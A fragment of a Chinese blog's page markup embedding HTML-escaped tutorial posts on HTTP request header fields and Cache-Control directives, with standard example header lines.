&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;WWW-Authenticate: Basic realm=&amp;quot;Usagidesign Auth&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。&lt;/p&gt;
">68-http-19-响应首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-qing-qiu-shou-bu-zi-duan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。&lt;/p&gt;
&lt;h2 id=&#34;列表&#34;&gt;列表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;请求首部&lt;/th&gt;
&lt;th&gt;作用（请求报文专用）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Accept&lt;/td&gt;
&lt;td&gt;能正确接收的媒体类型：&lt;code&gt;application/json&lt;/code&gt; &lt;code&gt;text/plain&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Charset&lt;/td&gt;
&lt;td&gt;能正确接收的字符集: &lt;code&gt;unicode-1-1&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Encoding&lt;/td&gt;
&lt;td&gt;能正确接收的内容编码格式列表：&lt;code&gt;gzip deflate&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Language&lt;/td&gt;
&lt;td&gt;能正确接收的语言列表：&lt;code&gt;zh-cn,zh;1=0.9,en,1=0.8&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Authorization&lt;/td&gt;
&lt;td&gt;客户端认证信息：&lt;code&gt;Bearer dSdSdFFlsfdjasd123&lt;/code&gt;，一般存token用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Expect&lt;/td&gt;
&lt;td&gt;指定期望条件，并告知服务器只有在满足此期望条件的情况下才能妥善地处理请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;From&lt;/td&gt;
&lt;td&gt;请求方邮箱地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Host&lt;/td&gt;
&lt;td&gt;服务器的域名，用于区分单台服务器多个域名的虚拟主机，是HTTP/1.1唯一必须包含的字段。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Match&lt;/td&gt;
&lt;td&gt;服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-None-Match&lt;/td&gt;
&lt;td&gt;服务器会比对 If-Match 的字段值和资源的 ETag 值，当两者不一致时，执行请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Modified-Since&lt;/td&gt;
&lt;td&gt;服务器只在所请求的资源在 If-Modified-Since 给定的日期时间之后对内容进行过修改的情况下才会将资源返回&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Unmodified-Since&lt;/td&gt;
&lt;td&gt;服务器只在所请求的资源在 If-Modified-Since 给定的日期时间之后对内容未进行过修改的情况下才会将资源返回&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Range&lt;/td&gt;
&lt;td&gt;该字段与Range字段配合使用，If-Range字段值中的条件得到满足时，Range 头字段才会起作用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Max-Forwards&lt;/td&gt;
&lt;td&gt;限制可被代理及网关转发的次数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Proxy-Authorization&lt;/td&gt;
&lt;td&gt;向代理服务器发送验证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Range&lt;/td&gt;
&lt;td&gt;请求某个内容的一部分，配合&lt;code&gt;If-Range&lt;/code&gt;使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Referer&lt;/td&gt;
&lt;td&gt;请求发起页面的原始URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TE&lt;/td&gt;
&lt;td&gt;传输编码方式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;User-Agent&lt;/td&gt;
&lt;td&gt;客户端信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;accept&#34;&gt;Accept&lt;/h3&gt;
&lt;p&gt;Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;文本文件
text/html, text/plain, text/css ...
application/xhtml+xml, application/xml ...

图片文件
image/jpeg, image/gif, image/png ...

视频文件
video/mpeg, video/quicktime ...

应用程序使用的二进制文件
application/octet-stream, application/zip ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。&lt;br&gt;
若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/png,*/*;q=0.8
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;accept-charset&#34;&gt;Accept-Charset&lt;/h3&gt;
&lt;p&gt;Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字段 Accept 相同的是可用权重 q 值来表示相对优先级。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Accept-Charset: iso-8859-5, unicode-1-1;q=0.8
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;accept-encoding&#34;&gt;Accept-Encoding&lt;/h3&gt;
&lt;p&gt;Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gzip
由文件压缩程序 gzip（GNU zip）生成的编码格式（RFC1952），采用 Lempel-Ziv 算法（LZ77）及 32 位循环冗余校验（Cyclic Redundancy Check，通称 CRC）。

compress
由 UNIX 文件压缩程序 compress 生成的编码格式，采用 LempelZiv-Welch 算法（LZW）。

deflate
组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法（RFC1951）生成的编码格式。

identity
不执行压缩或不会变化的默认编码格式
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另外，也可使用星号（*）作为通配符，指定任意的编码格式。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Accept-Encoding: gzip, deflate
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;accept-language&#34;&gt;Accept-Language&lt;/h3&gt;
&lt;p&gt;首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。&lt;br&gt;
和 Accept 首部字段一样，按权重值 q 来表示相对优先级。客户端在服务器有中文版资源的情况下，会请求其返回中文版对应的响应，没有中文版时，则请求返回英文版响应。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;authorization&#34;&gt;Authorization&lt;/h3&gt;
&lt;p&gt;首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Authorization: Basic dWVub3NlbjpwYXNzd29yZA==
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;expect&#34;&gt;Expect&lt;/h3&gt;
&lt;p&gt;客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。&lt;/p&gt;
&lt;p&gt;等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100-continue。&lt;/p&gt;
&lt;p&gt;客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规范只定义了 100-continue（状态码 100 Continue 之意）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Expect: 100-continue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;返回100表示请求头中的期望条件可以得到满足&lt;/p&gt;
&lt;p&gt;因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。&lt;/p&gt;
&lt;h3 id=&#34;from&#34;&gt;From&lt;/h3&gt;
&lt;p&gt;首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;From: webmaster@example.org
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;host&#34;&gt;Host&lt;/h3&gt;
&lt;p&gt;首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。&lt;u&gt;Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。&lt;/u&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Host: www.hackr.jp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制有很密切的关联，这是首部字段 Host 必须存在的意义。&lt;/p&gt;
&lt;p&gt;请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。如下所示。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Host:
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;if-match&#34;&gt;If-Match&lt;/h3&gt;
&lt;p&gt;形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;If-Match: &amp;quot;123456&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。&lt;/p&gt;
&lt;p&gt;服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。&lt;/p&gt;
&lt;p&gt;ETag 之间的比较使用的是强比较算法，即只有在每一个字节都相同的情况下，才可以认为两个文件是相同的。在 ETag 前面添加 W/ 前缀表示可以采用相对宽松的算法。&lt;/p&gt;
&lt;p&gt;还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务器将会忽略 ETag 的值，只要资源存在就处理请求。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;If-Match: &amp;quot;bfc13a64729c4290ef5b2c2730249c88ca92d82d&amp;quot;
If-Match: W/&amp;quot;67ab43&amp;quot;, &amp;quot;54ed21&amp;quot;, &amp;quot;7892dd&amp;quot;
If-Match: *
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;if-none-match&#34;&gt;If-None-Match&lt;/h3&gt;
&lt;p&gt;首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与请求资源的 ETag 不一致时，它就告知服务器处理该请求。&lt;/p&gt;
&lt;p&gt;在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;If-None-Match: &amp;quot;bfc13a64729c4290ef5b2c2730249c88ca92d82d&amp;quot;
If-None-Match: W/&amp;quot;67ab43&amp;quot;, &amp;quot;54ed21&amp;quot;, &amp;quot;7892dd&amp;quot;
If-None-Match: *
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;if-modified-since&#34;&gt;If-Modified-Since&lt;/h3&gt;
&lt;p&gt;首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 IfModified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。&lt;/p&gt;
&lt;p&gt;If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;if-unmodified-since&#34;&gt;If-Unmodified-Since&lt;/h3&gt;
&lt;p&gt;首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;if-range&#34;&gt;If-Range&lt;/h3&gt;
&lt;p&gt;该字段与Range字段配合使用，If-Range字段值中的条件得到满足时，Range 头字段才会起作用&lt;/p&gt;
&lt;p&gt;首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If-Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。&lt;/p&gt;
&lt;p&gt;下面我们思考一下不使用首部字段 If-Range 发送请求的情况。服务器端的资源如果更新，那客户端持有资源中的一部分也会随之无效，当然，范围请求作为前提是无效的。这时，服务器会暂且以状态码 412Precondition Failed 作为响应返回，其目的是催促客户端再次发送请求。这样一来，与使用首部字段 If-Range 比起来，就需要花费两倍的功夫。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;GET /index.html
If-Range: &amp;quot;123456&amp;quot;
Range: bytes=5001-10000
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;max-forwards&#34;&gt;Max-Forwards&lt;/h3&gt;
&lt;p&gt;通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 MaxForwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求时，则不再进行转发，而是直接返回响应。&lt;/p&gt;
&lt;p&gt;使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中，如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应了。对此，我们无从可知。&lt;/p&gt;
&lt;p&gt;可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状况有所把握。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Max-Forwards: 10
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;proxy-authorization&#34;&gt;Proxy-Authorization&lt;/h3&gt;
&lt;p&gt;接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。&lt;/p&gt;
&lt;p&gt;这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 Authorization 可起到相同作用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Proxy-Authorization: Basic dGlwOjkpNLAGfFY5
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;range&#34;&gt;Range&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Range: bytes=5001-10000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。&lt;/p&gt;
&lt;p&gt;接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。&lt;/p&gt;
&lt;h3 id=&#34;referer&#34;&gt;Referer&lt;/h3&gt;
&lt;p&gt;首部字段 Referer 会告知服务器请求的原始资源的 URI。&lt;/p&gt;
&lt;p&gt;客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。&lt;/p&gt;
&lt;p&gt;因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的泄露。&lt;/p&gt;
&lt;p&gt;另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Referer: http://www.hackr.jp/index.htm
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;te&#34;&gt;TE&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;TE: gzip, deflate;q=0.5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。&lt;/p&gt;
&lt;p&gt;&lt;u&gt;TE是用于传输编码，而Accept-Encoding用于内容编码。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;TE: trailers
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;user-agent&#34;&gt;User-Agent&lt;/h3&gt;
&lt;p&gt;User-Agent 用于传达浏览器的种类&lt;/p&gt;
&lt;p&gt;首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。&lt;/p&gt;
&lt;p&gt;由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36 Name
&lt;/code&gt;&lt;/pre&gt;
">67-http-18-请求首部字段</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-tong-yong-shou-bu-zi-duan-cache-control/"" data-c="
          &lt;h1 id=&#34;http-通用首部字段cache-control&#34;&gt;http-通用首部字段Cache-Control&lt;/h1&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。&lt;/p&gt;
&lt;h2 id=&#34;书写格式&#34;&gt;书写格式&lt;/h2&gt;
&lt;p&gt;指令的参数是可选的，多个指令之间通过“,”分隔。首部字段 CacheControl 的指令可用于请求及响应时。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: private, max-age=0, no-cache
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;h3 id=&#34;缓存请求指令&#34;&gt;缓存请求指令&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;no-cache&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;不使用缓存，缓存服务器必须把客户端请求转发给源服务器，在与源服务器进行新鲜度再验证之前，不能提供给客户端使用。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-store&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;真正的不使用缓存，任何地方都不缓存请求或响应的任何内容。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;max-age=60&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;资源可缓存最大时间(相对时间：秒)，即过期时间、保质期。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;max-stale=60&lt;/td&gt;
&lt;td&gt;可省略&lt;/td&gt;
&lt;td&gt;缓存资源，只要仍处于 max-stale指定的时间(秒)内，即使过期也照常接收。缓存总时长为max-age和max-stale叠加。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;min-fresh=60&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;期望在指定时间内(未来60秒内)的响应保持新鲜&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-transform&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;代理不可更改媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;only-if-cached&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;只从缓存获取资源，若有则返回，若无则504&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;缓存响应指令&#34;&gt;缓存响应指令&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;no-cache&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;缓存前必须先确认其有效性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-store&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;不缓存请求或响应的任何内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;public&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;客户端、代理服务器都可利用缓存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;private&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;仅发起请求的客户端可利用缓存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;max-age=60&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;针对源服务器，资源可缓存最大时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;s-maxage=60&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;针对代理缓存服务器，资源可缓存最大时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;must-revalidate&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;可缓存但必须再向源服务器进行确认&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;proxy-revalidate&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;代理缓存服务器对缓存的响应有效性再进行确认&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-transform&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;代理不可更改媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;详解&#34;&gt;详解&lt;/h2&gt;
&lt;h3 id=&#34;no-cache&#34;&gt;no-cache&lt;/h3&gt;
&lt;p&gt;使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;客户端&lt;/strong&gt;发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。&lt;/p&gt;
&lt;p&gt;如果&lt;strong&gt;服务器&lt;/strong&gt;返回的响应中包含 no-cache 指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: no-cache
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果可以使用缓存，则304；不可以使用，则200。&lt;/p&gt;
&lt;h3 id=&#34;max-age&#34;&gt;max-age&lt;/h3&gt;
&lt;p&gt;当&lt;strong&gt;客户端&lt;/strong&gt;发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。&lt;br&gt;
另外，&lt;u&gt;当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;当&lt;strong&gt;服务器&lt;/strong&gt;返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: max-age=604800（单位：秒）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有一个问题 catch-control 是客户端缓存，当max-age 之内，服务端更新了数据，客户端是不能知道的。&lt;/p&gt;
&lt;p&gt;这个问题，前端的一种常用的解决方案是，将打包的js文件名加入一段哈希码，当打包内容不变时，哈希码就不变。这样子，当内容不变时，请求的url 也就不变，当内容变了请求的url 也变了。这样就达到了更新缓存的目的。&lt;/p&gt;
&lt;h3 id=&#34;min-fresh&#34;&gt;min-fresh&lt;/h3&gt;
&lt;p&gt;min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。&lt;/p&gt;
&lt;p&gt;比如，当指定 min-fresh 为 60 秒后，过了 60 秒的资源都无法作为响应返回了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: min-fresh=60（单位：秒）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;max-stale&#34;&gt;max-stale&lt;/h3&gt;
&lt;p&gt;使用 max-stale 可指示缓存资源，即使过期也照常接收。&lt;/p&gt;
&lt;p&gt;如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale指定的时间内，仍旧会被客户端接收。&lt;/p&gt;
&lt;p&gt;&lt;u&gt;如果指令未指定参数值，那么无论经过多久，客户端都会接收响应；&lt;/u&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: max-stale=3600（单位：秒）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;only-if-cached&#34;&gt;only-if-cached&lt;/h3&gt;
&lt;p&gt;使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Cache-Control: only-if-cached
&lt;/code&gt;&lt;/pre&gt;
